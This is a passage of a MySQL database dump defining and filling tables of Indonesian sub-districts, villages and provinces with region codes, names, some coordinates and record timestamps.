INSERT INTO `sdp_master_kecamatan` VALUES (28, '11', '14', '05', 'Jaya', NULL, NULL, '1', 1, '2019-11-04 19:28:54', NULL, '2019-11-04 19:28:54', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (29, '11', '10', '04', 'Singkil', '2.278979', '97.794147', '1', 1, '2019-11-04 19:30:40', NULL, '2020-09-17 02:46:28', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (30, '11', '04', '02', 'Silih Nara', NULL, NULL, '1', 1, '2019-11-04 19:35:21', NULL, '2019-11-04 19:35:21', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (31, '11', '02', '12', 'Ketambe', NULL, NULL, '1', 1, '2019-11-04 19:38:27', NULL, '2019-11-04 19:38:27', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (32, '32', '09', '10', 'Astanajapura', NULL, NULL, '1', 1, '2019-11-11 10:03:22', NULL, '2019-11-11 10:03:22', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (33, '32', '11', '10', 'Buahdua', NULL, NULL, '1', 1, '2019-11-11 10:10:29', NULL, '2019-11-11 10:10:29', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (34, '32', '11', '22', 'Cimalaka', NULL, NULL, '1', 1, '2019-11-11 10:31:37', NULL, '2019-11-11 10:31:37', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (35, '63', '71', '02', 'Banjarmasin Timur', NULL, NULL, '1', 1, '2019-11-11 10:47:40', NULL, '2019-11-11 10:47:40', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (36, '63', '71', '04', 'Banjarmasin Utara', NULL, NULL, '1', 1, '2019-11-11 10:56:05', NULL, '2019-11-11 10:56:05', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (37, '11', '71', '09', 'Ulee Kareng', NULL, NULL, '1', 1, '2019-11-11 11:12:12', NULL, '2019-11-11 11:12:12', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (38, '32', '01', '14', 'Leuwiliang', NULL, NULL, '1', 1, '2019-11-11 11:14:21', NULL, '2019-11-11 11:14:21', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (39, '35', '29', '09', 'Guluk-guluk', NULL, NULL, '1', 1, '2019-11-11 11:19:24', NULL, '2019-11-11 11:19:24', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (40, '18', '10', '01', 'Piringsewu', NULL, NULL, '1', 1, '2019-11-11 11:21:45', NULL, '2019-11-11 11:21:45', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (41, '62', '11', '07', 'Jabrien', NULL, NULL, '1', 1, '2019-11-11 11:23:44', NULL, '2019-11-11 11:23:44', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (42, '34', '03', '01', 'Wonosari', NULL, NULL, '1', 1, '2019-11-11 11:25:55', NULL, '2019-11-11 11:25:55', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (43, '34', '02', '15', 'Sewon', NULL, NULL, '1', 1, '2019-11-11 11:47:35', NULL, '2019-11-11 11:47:35', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (44, '13', '77', '02', 'Pariaman Utara', NULL, NULL, '1', 1, '2019-11-11 11:50:39', NULL, '2019-11-11 11:50:39', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (45, '33', '18', '16', 'Margoyoso', NULL, NULL, '1', 1, '2019-11-11 12:06:43', NULL, '2019-11-11 12:06:43', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (46, '73', '10', '02', 'Liukang Kalmas', NULL, NULL, '1', 1, '2019-11-11 12:15:25', NULL, '2019-11-11 12:15:25', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (48, '19', '02', '01', 'Tanjung Pandang', NULL, NULL, '1', 1, '2019-11-11 12:18:53', NULL, '2019-11-11 12:18:53', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (49, '14', '10', '01', 'Tebing Tinggi', NULL, NULL, '1', 1, '2019-11-11 12:24:05', NULL, '2019-11-11 12:24:05', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (50, '36', '73', '06', 'Tatakan', NULL, NULL, '1', 1, '2019-11-11 12:29:19', NULL, '2019-11-11 12:29:19', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (51, '18', '12', '01', 'Tulang Bawang Tengah', NULL, NULL, '1', 1, '2019-11-11 12:34:35', NULL, '2019-11-11 12:34:35', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (52, '33', '07', '04', 'Kaliwiro', NULL, NULL, '1', 1, '2019-11-11 12:37:16', NULL, '2019-11-11 12:37:16', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (53, '16', '71', '07', 'Sukarami', NULL, NULL, '1', 1, '2019-11-11 12:39:37', NULL, '2019-11-11 12:39:37', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (54, '16', '71', '03', 'Seberang Ulu II', NULL, NULL, '1', 1, '2019-11-11 12:41:17', NULL, '2019-11-11 12:41:17', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (55, '16', '10', '16', 'Payaraman', NULL, NULL, '1', 1, '2019-11-11 12:44:08', NULL, '2019-11-11 12:44:08', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (56, '32', '14', '09', 'Wanayasa', NULL, NULL, '1', 1, '2019-11-11 12:46:01', NULL, '2019-11-11 12:46:01', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (58, '74', '71', '03', 'Baruga', NULL, NULL, '1', 1, '2019-11-11 12:57:44', NULL, '2019-11-11 12:57:44', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (61, '35', '78', '04', 'Wonokromo', NULL, NULL, '1', 1, '2019-11-11 13:03:59', NULL, '2019-11-11 13:03:59', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (62, '16', '72', '04', 'Depo Selatan', NULL, NULL, '1', 1, '2019-11-11 13:06:16', NULL, '2019-11-11 13:06:16', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (63, '33', '02', '21', 'Sumbang', NULL, NULL, '1', 1, '2019-11-11 13:09:03', NULL, '2019-11-11 13:09:03', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (64, '33', '27', '03', 'Belik', NULL, NULL, '1', 1, '2019-11-11 13:10:53', NULL, '2019-11-11 13:10:53', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (65, '33', '02', '23', 'Kedung Banteng', NULL, NULL, '1', 1, '2019-11-11 18:59:12', NULL, '2019-11-11 18:59:12', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (66, '75', '01', '21', 'Asparaga', NULL, NULL, '1', 1, '2019-11-11 19:10:42', NULL, '2019-11-11 19:10:42', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (67, '52', '01', '08', 'Labuapi', NULL, NULL, '1', 1, '2019-11-11 19:14:55', NULL, '2019-11-11 19:14:55', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (68, '11', '02', '06', 'Babul Makmur', NULL, NULL, '1', 1, '2019-11-20 13:49:18', NULL, '2019-11-20 13:49:18', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (69, '11', '02', '11', 'Babul Rahmah', NULL, NULL, '1', 1, '2019-11-20 13:49:37', NULL, '2019-11-20 13:49:37', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (70, '11', '02', '04', 'Babussalam', NULL, NULL, '1', 1, '2019-11-20 13:50:53', NULL, '2019-11-20 13:50:53', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (71, '11', '02', '03', 'Badar', NULL, NULL, '1', 1, '2019-11-20 13:51:39', NULL, '2019-11-20 13:51:39', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (72, '11', '02', '03', 'Bambel', NULL, NULL, '1', 1, '2019-11-20 13:51:55', NULL, '2019-11-20 13:51:55', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (73, '11', '02', '09', 'Bukit Hasan', NULL, NULL, '1', 1, '2019-11-20 13:52:11', NULL, '2019-11-20 13:52:11', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (74, '11', '02', '07', 'Darul Hasanah', NULL, NULL, '1', 1, '2019-11-20 13:52:34', NULL, '2019-11-20 13:52:34', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (75, '11', '02', '13', 'Deleng Pokhkisen', NULL, NULL, '1', 1, '2019-11-20 13:53:04', NULL, '2019-11-20 13:53:04', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (76, '11', '02', '01', 'Lawe Alas', NULL, NULL, '1', 1, '2019-11-20 13:53:22', NULL, '2019-11-20 13:53:22', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (77, '11', '02', '08', 'Lawe Bulan', NULL, NULL, '1', 1, '2019-11-20 13:53:45', NULL, '2019-11-20 13:53:45', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (78, '11', '02', '02', 'Lawe Sigala Gala', NULL, NULL, '1', 1, '2019-11-20 13:58:44', NULL, '2019-11-20 13:58:44', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (79, '11', '02', '14', 'Lawe Sumur', NULL, NULL, '1', 1, '2019-11-20 13:59:20', NULL, '2019-11-20 13:59:20', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (80, '11', '02', '16', 'Leuser', NULL, NULL, '1', 1, '2019-11-20 13:59:41', NULL, '2019-11-20 13:59:41', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (81, '11', '02', '10', 'Semadam', NULL, NULL, '1', 1, '2019-11-20 13:59:58', NULL, '2019-11-20 13:59:58', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (82, '11', '02', '15', 'Tanoh Alas', NULL, NULL, '1', 1, '2019-11-20 14:00:15', NULL, '2019-11-20 14:00:15', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (83, '18', '71', '12', 'Sukabumi', NULL, NULL, '1', 1, '2020-09-14 21:54:20', NULL, '2020-09-14 21:54:20', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (84, '36', '74', '05', 'Ciputat Timur', NULL, NULL, '1', 1, '2020-09-14 21:58:22', NULL, '2020-09-14 21:58:22', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (85, '61', '71', '06', 'Pontianak Tenggara', NULL, NULL, '1', 1, '2020-09-14 22:53:08', NULL, '2020-09-14 22:53:08', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (86, '11', '10', '12', 'Sukabumi', '', '', '1', 1, '2020-09-14 23:23:51', 1, '2020-09-14 23:25:00', '::1');

-- ----------------------------
-- Table structure for sdp_master_keldes
-- ----------------------------
DROP TABLE IF EXISTS `sdp_master_keldes`;
CREATE TABLE `sdp_master_keldes`  (
  `keldes_id` int(11) NOT NULL AUTO_INCREMENT,
  `keldes_provinsi_kode` varchar(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `keldes_kabkot_kode` varchar(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `keldes_kecamatan_kode` varchar(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `keldes_kode` char(4) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `keldes_nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `keldes_latitude` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `keldes_longtitude` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `keldes_status` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT '1',
  `keldes_createdby` int(11) DEFAULT NULL,
  `keldes_createddate` datetime(0) DEFAULT NULL,
  `keldes_updatedby` int(11) DEFAULT NULL,
  `keldes_lastupdate` timestamp(0) NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP(0),
  `keldes_ip` char(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  PRIMARY KEY (`keldes_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 67 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_master_keldes
-- ----------------------------
INSERT INTO `sdp_master_keldes` VALUES (1, '11', '01', '01', '2015', 'Darul Ikhsan', NULL, NULL, '1', 1, '2019-10-20 14:22:10', NULL, '2019-10-20 14:27:52', '::1');
INSERT INTO `sdp_master_keldes` VALUES (2, '11', '01', '01', '2017', 'Gampong Baro', NULL, NULL, '1', 1, '2019-10-20 14:22:27', NULL, '2019-10-20 14:27:52', '::1');
INSERT INTO `sdp_master_keldes` VALUES (3, '11', '01', '01', '2004', 'Gampong Drien', NULL, NULL, '1', 1, '2019-10-20 14:22:44', NULL, '2019-10-20 14:27:52', '::1');
INSERT INTO `sdp_master_keldes` VALUES (4, '11', '01', '01', '2001', 'Keude Bakongan', NULL, NULL, '1', 1, '2019-10-20 14:22:59', NULL, '2019-10-20 14:27:52', '::1');
INSERT INTO `sdp_master_keldes` VALUES (5, '11', '01', '01', '2016', 'Padang Beurahan', NULL, NULL, '1', 1, '2019-10-20 14:23:11', NULL, '2019-10-20 14:27:52', '::1');
INSERT INTO `sdp_master_keldes` VALUES (6, '11', '01', '01', '2002', 'Ujong Mangki', NULL, NULL, '1', 1, '2019-10-20 14:23:27', NULL, '2019-10-20 14:27:52', '::1');
INSERT INTO `sdp_master_keldes` VALUES (7, '11', '01', '01', '2003', 'Ujong Padang', NULL, NULL, '1', 1, '2019-10-20 14:23:39', NULL, '2019-10-20 14:27:52', '::1');
INSERT INTO `sdp_master_keldes` VALUES (8, '32', '13', '11', '2004', 'Pamanukan', NULL, NULL, '1', 1, '2019-10-24 16:04:06', NULL, '2019-10-24 16:04:06', '::1');
INSERT INTO `sdp_master_keldes` VALUES (9, '32', '12', '10', '2019', 'Kaplongan Lor (Kaplonganlor)', NULL, NULL, '1', 1, '2019-10-30 21:53:54', NULL, '2019-10-30 21:53:54', '::1');
INSERT INTO `sdp_master_keldes` VALUES (10, '32', '12', '09', '2003', 'Singakerta', NULL, NULL, '1', 1, '2019-10-30 21:56:02', NULL, '2019-10-30 21:56:02', '::1');
INSERT INTO `sdp_master_keldes` VALUES (11, '32', '13', '15', '2003', 'Jatireja', NULL, NULL, '1', 1, '2019-11-04 18:48:55', NULL, '2019-11-04 18:48:55', '::1');
INSERT INTO `sdp_master_keldes` VALUES (12, '32', '12', '29', '2005', 'Karanganyar', NULL, NULL, '1', 1, '2019-11-04 18:52:07', NULL, '2019-11-04 18:52:07', '::1');
INSERT INTO `sdp_master_keldes` VALUES (13, '32', '12', '11', '2001', 'Segeran Kidul', NULL, NULL, '1', 1, '2019-11-04 18:54:26', NULL, '2019-11-04 18:54:26', '::1');
INSERT INTO `sdp_master_keldes` VALUES (14, '32', '76', '02', '1011', 'Tugu', NULL, NULL, '1', 1, '2019-11-04 18:57:00', NULL, '2019-11-04 18:57:00', '::1');
INSERT INTO `sdp_master_keldes` VALUES (15, '32', '01', '29', '1003', 'Padasuka', NULL, NULL, '1', 1, '2019-11-04 18:59:25', NULL, '2019-11-04 18:59:25', '::1');
INSERT INTO `sdp_master_keldes` VALUES (17, '32', '09', '27', '2009', 'Bunder', NULL, NULL, '1', 1, '2019-11-04 19:06:27', NULL, '2019-11-04 19:06:27', '::1');
INSERT INTO `sdp_master_keldes` VALUES (18, '11', '14', '05', '2038', 'Lhuet', NULL, NULL, '1', 1, '2019-11-04 19:29:20', NULL, '2019-11-04 19:29:20', '::1');
INSERT INTO `sdp_master_keldes` VALUES (19, '11', '10', '04', '2007', 'Teluk Ambun', '2.297482', '97.806553', '1', 1, '2019-11-04 19:32:35', NULL, '2020-09-17 02:48:40', '::1');
INSERT INTO `sdp_master_keldes` VALUES (20, '11', '10', '04', '2016', 'Suka Makmur', '2.365489', '97.955438', '1', 1, '2019-11-04 19:32:57', NULL, '2020-09-17 03:13:09', '::1');
INSERT INTO `sdp_master_keldes` VALUES (21, '11', '10', '04', '2012', 'Takal Pasir', NULL, NULL, '1', 1, '2019-11-04 19:33:12', NULL, '2019-11-04 19:33:12', '::1');
INSERT INTO `sdp_master_keldes` VALUES (22, '11', '10', '04', '2017', 'Ujung Bawang', '2.289288', '97.847022', '1', 1, '2019-11-04 19:33:30', NULL, '2020-09-17 03:14:23', '::1');
INSERT INTO `sdp_master_keldes` VALUES (23, '11', '10', '04', '2010', 'Pea Bumbung', NULL, NULL, '1', 1, '2019-11-04 19:34:19', NULL, '2019-11-04 19:34:19', '::1');
INSERT INTO `sdp_master_keldes` VALUES (24, '11', '10', '04', '2002', 'Ujung', NULL, NULL, '1', 1, '2019-11-04 19:34:34', NULL, '2019-11-04 19:34:34', '::1');
INSERT INTO `sdp_master_keldes` VALUES (25, '11', '04', '02', '2035', 'Mekar Indah', NULL, NULL, '1', 1, '2019-11-04 19:35:50', NULL, '2019-11-04 19:35:50', '::1');
INSERT INTO `sdp_master_keldes` VALUES (26, '11', '02', '12', '2002', 'Laweh Penanggalan', NULL, NULL, '1', 1, '2019-11-04 19:38:54', NULL, '2019-11-04 19:38:54', '::1');
INSERT INTO `sdp_master_keldes` VALUES (27, '11', '02', '12', '2020', 'Bukit Mbakhu', NULL, NULL, '1', 1, '2019-11-04 19:41:08', NULL, '2019-11-04 19:41:08', '::1');
INSERT INTO `sdp_master_keldes` VALUES (28, '32', '09', '10', '2011', 'Astanajapura', NULL, NULL, '1', 1, '2019-11-11 10:03:45', NULL, '2019-11-11 10:03:45', '::1');
INSERT INTO `sdp_master_keldes` VALUES (29, '32', '11', '10', '2001', 'Buahdua', NULL, NULL, '1', 1, '2019-11-11 10:11:27', NULL, '2019-11-11 10:11:27', '::1');
INSERT INTO `sdp_master_keldes` VALUES (30, '32', '11', '22', '2010', 'Licin', NULL, NULL, '1', 1, '2019-11-11 10:32:20', NULL, '2019-11-11 10:32:20', '::1');
INSERT INTO `sdp_master_keldes` VALUES (31, '63', '71', '02', '1008', 'Pekapuran Raya', NULL, NULL, '1', 1, '2019-11-11 10:48:11', NULL, '2019-11-11 10:48:11', '::1');
INSERT INTO `sdp_master_keldes` VALUES (32, '63', '71', '04', '1010', 'Sungai Andai', NULL, NULL, '1', 1, '2019-11-11 10:56:49', NULL, '2019-11-11 10:56:49', '::1');
INSERT INTO `sdp_master_keldes` VALUES (33, '11', '71', '09', '2004', 'Pango Raya', NULL, NULL, '1', 1, '2019-11-11 11:12:37', NULL, '2019-11-11 11:12:37', '::1');
INSERT INTO `sdp_master_keldes` VALUES (34, '32', '01', '14', '2001', 'Leuwiliang', NULL, NULL, '1', 1, '2019-11-11 11:14:43', NULL, '2019-11-11 11:14:43', '::1');
INSERT INTO `sdp_master_keldes` VALUES (35, '35', '29', '09', '2004', 'Guluk-guluk', NULL, NULL, '1', 1, '2019-11-11 11:19:47', NULL, '2019-11-11 11:19:47', '::1');
INSERT INTO `sdp_master_keldes` VALUES (36, '18', '10', '01', '2012', 'Rejo Sari', NULL, NULL, '1', 1, '2019-11-11 11:22:05', NULL, '2019-11-11 11:22:05', '::1');
INSERT INTO `sdp_master_keldes` VALUES (37, '62', '11', '07', '2005', 'Jabrien', NULL, NULL, '1', 1, '2019-11-11 11:24:09', NULL, '2019-11-11 11:24:09', '::1');
INSERT INTO `sdp_master_keldes` VALUES (38, '34', '03', '01', '2002', 'Kepek', NULL, NULL, '1', 1, '2019-11-11 11:26:11', NULL, '2019-11-11 11:26:11', '::1');
INSERT INTO `sdp_master_keldes` VALUES (39, '34', '02', '15', '2002', 'Timbulharjo', NULL, NULL, '1', 1, '2019-11-11 11:48:01', NULL, '2019-11-11 11:48:01', '::1');
INSERT INTO `sdp_master_keldes` VALUES (40, '13', '77', '02', '2005', 'Ampalu', NULL, NULL, '1', 1, '2019-11-11 11:50:56', NULL, '2019-11-11 11:50:56', '::1');
INSERT INTO `sdp_master_keldes` VALUES (41, '33', '18', '16', '2012', 'Kajen', NULL, NULL, '1', 1, '2019-11-11 12:07:21', NULL, '2019-11-11 12:07:21', '::1');
INSERT INTO `sdp_master_keldes` VALUES (42, '73', '10', '02', '1001', 'Kalukuang', NULL, NULL, '1', 1, '2019-11-11 12:15:56', NULL, '2019-11-11 12:15:56', '::1');
INSERT INTO `sdp_master_keldes` VALUES (43, '19', '02', '01', '2015', 'Air Rayak', NULL, NULL, '1', 1, '2019-11-11 12:19:01', NULL, '2019-11-11 12:19:01', '::1');
INSERT INTO `sdp_master_keldes` VALUES (44, '14', '10', '01', '1001', 'Selat Panjang Kota', NULL, NULL, '1', 1, '2019-11-11 12:24:32', NULL, '2019-11-11 12:24:32', '::1');
INSERT INTO `sdp_master_keldes` VALUES (45, '36', '73', '06', '1008', 'Drangong', NULL, NULL, '1', 1, '2019-11-11 12:29:40', NULL, '2019-11-11 12:29:40', '::1');
INSERT INTO `sdp_master_keldes` VALUES (46, '73', '10', '02', '2002', 'Pammas', NULL, NULL, '1', 1, '2019-11-11 12:31:20', NULL, '2019-11-11 12:31:20', '::1');
INSERT INTO `sdp_master_keldes` VALUES (47, '18', '12', '01', '1007', 'Panaragan Jaya', NULL, NULL, '1', 1, '2019-11-11 12:35:08', NULL, '2019-11-11 12:35:08', '::1');
INSERT INTO `sdp_master_keldes` VALUES (48, '33', '07', '04', '1015', 'Kaliwiro', NULL, NULL, '1', 1, '2019-11-11 12:37:37', NULL, '2019-11-11 12:37:37', '::1');
INSERT INTO `sdp_master_keldes` VALUES (49, '16', '71', '07', '1002', 'Talang Betutu', NULL, NULL, '1', 1, '2019-11-11 12:40:24', NULL, '2019-11-11 12:40:24', '::1');
INSERT INTO `sdp_master_keldes` VALUES (50, '16', '71', '03', '1006', 'Tangga Takat', NULL, NULL, '1', 1, '2019-11-11 12:41:40', NULL, '2019-11-11 12:41:40', '::1');
INSERT INTO `sdp_master_keldes` VALUES (51, '16', '10', '16', '2012', 'Payaraman Barat', NULL, NULL, '1', 1, '2019-11-11 12:44:41', NULL, '2019-11-11 12:44:41', '::1');
INSERT INTO `sdp_master_keldes` VALUES (52, '32', '14', '09', '2005', 'Nagrog', NULL, NULL, '1', 1, '2019-11-11 12:47:11', NULL, '2019-11-11 12:47:11', '::1');
INSERT INTO `sdp_master_keldes` VALUES (53, '74', '71', '03', '1001', 'Baruga', NULL, NULL, '1', 1, '2019-11-11 12:57:59', NULL, '2019-11-11 12:57:59', '::1');
INSERT INTO `sdp_master_keldes` VALUES (54, '35', '78', '04', '1001', 'Wonokromo', NULL, NULL, '1', 1, '2019-11-11 13:04:24', NULL, '2019-11-11 13:04:24', '::1');
INSERT INTO `sdp_master_keldes` VALUES (55, '16', '72', '04', '1020', 'Kance Diwe', NULL, NULL, '1', 1, '2019-11-11 13:06:43', NULL, '2019-11-11 13:06:43', '::1');
INSERT INTO `sdp_master_keldes` VALUES (56, '33', '02', '21', '2012', 'Banteran', NULL, NULL, '1', 1, '2019-11-11 13:09:23', NULL, '2019-11-11 13:09:23', '::1');
INSERT INTO `sdp_master_keldes` VALUES (57, '33', '27', '03', '2002', 'Belik', NULL, NULL, '1', 1, '2019-11-11 13:11:14', NULL, '2019-11-11 13:11:14', '::1');
INSERT INTO `sdp_master_keldes` VALUES (58, '63', '71', '04', '1004', 'Sungai Jingah', NULL, NULL, '1', 1, '2019-11-11 13:15:12', NULL, '2019-11-11 13:15:12', '::1');
INSERT INTO `sdp_master_keldes` VALUES (59, '33', '02', '23', '2003', 'Kedung Banteng', NULL, NULL, '1', 1, '2019-11-11 18:59:38', NULL, '2019-11-11 18:59:38', '::1');
INSERT INTO `sdp_master_keldes` VALUES (60, '32', '12', '11', '2002', 'Segeran', NULL, NULL, '1', 1, '2019-11-11 19:05:22', NULL, '2019-11-11 19:05:22', '::1');
INSERT INTO `sdp_master_keldes` VALUES (61, '75', '01', '21', '2004', 'Karya Indah', NULL, NULL, '1', 1, '2019-11-11 19:11:08', NULL, '2019-11-11 19:11:08', '::1');
INSERT INTO `sdp_master_keldes` VALUES (62, '52', '01', '08', '2012', 'Kuranji Dalang', NULL, NULL, '1', 1, '2019-11-11 19:15:28', NULL, '2019-11-11 19:15:28', '::1');
INSERT INTO `sdp_master_keldes` VALUES (63, '18', '71', '12', '1002', 'Sukabumi', NULL, NULL, '1', 1, '2020-09-14 21:55:13', NULL, '2020-09-14 21:55:13', '::1');
INSERT INTO `sdp_master_keldes` VALUES (64, '36', '74', '05', '1001', 'Cempaka Putih', NULL, NULL, '1', 1, '2020-09-14 21:59:05', NULL, '2020-09-14 21:59:05', '::1');
INSERT INTO `sdp_master_keldes` VALUES (65, '61', '71', '06', '1001', 'Bansir Laut', NULL, NULL, '1', 1, '2020-09-14 22:53:40', NULL, '2020-09-14 22:53:40', '::1');
INSERT INTO `sdp_master_keldes` VALUES (66, '11', '10', '04', '1001', 'Cempaka Putih', '', '', '1', 1, '2020-09-14 23:31:44', 1, '2020-09-14 23:31:57', '::1');

-- ----------------------------
-- Table structure for sdp_master_provinsi
-- ----------------------------
DROP TABLE IF EXISTS `sdp_master_provinsi`;
CREATE TABLE `sdp_master_provinsi`  (
  `provinsi_id` int(11) NOT NULL AUTO_INCREMENT,
  `provinsi_kode` char(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `provinsi_nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `provinsi_latitude` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `provinsi_longtitude` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `provinsi_status` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT '1',
  `provinsi_createdby` int(11) DEFAULT NULL,
  `provinsi_createddate` datetime(0) DEFAULT NULL,
  `provinsi_updatedby` int(11) DEFAULT NULL,
  `provinsi_lastupdate` timestamp(0) NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP(0),
  `provinsi_ip` char(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  PRIMARY KEY (`provinsi_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 35 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_master_provinsi
-- ----------------------------
INSERT INTO `sdp_master_provinsi` VALUES (1, '11', 'ACEH', '4.695135', '96.749397', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:00:34', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (2, '12', 'SUMATERA UTARA', '2.115355', '99.545097', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:01:08', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (3, '13', 'SUMATERA BARAT', '-0.739940', '100.800003', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:01:50', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (4, '14', 'RIAU', '0.293347', '101.706825', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:04:57', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (5, '15', 'JAMBI', '-1.485183', '102.438057', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:05:02', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (6, '16', 'SUMATERA SELATAN', '-3.320950', '104.082382', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:01:28', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (7, '17', 'BENGKULU', '-3.577847', '102.346390', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:05:17', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (8, '18', 'LAMPUNG', '-4.852910', '104.720192', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:05:29', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (9, '19', 'KEPULAUAN BANGKA BELITUNG', '-2.153500', '-2.153500', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:05:42', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (10, '21', 'KEPULAUAN RIAU', '2.004780', '2.004780', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:05:53', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (11, '31', 'DKI JAKARTA', '-6.175110', '106.865036', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:06:04', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (12, '32', 'JAWA BARAT', '-7.090911', '107.668884', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:00:01', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (13, '33', 'JAWA TENGAH', '-7.150975', '110.140259', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:07:17', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (14, '34', 'DI YOGYAKARTA', '-7.792070', '110.365959', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:06:26', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (15, '35', 'JAWA TIMUR', '-7.536064', '112.238403', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:06:53', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (16, '36', 'BANTEN', '-6.405817', '106.064018', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:07:30', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (17, '51', 'BALI', '-8.340539', '115.091949', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:07:41', '::1');
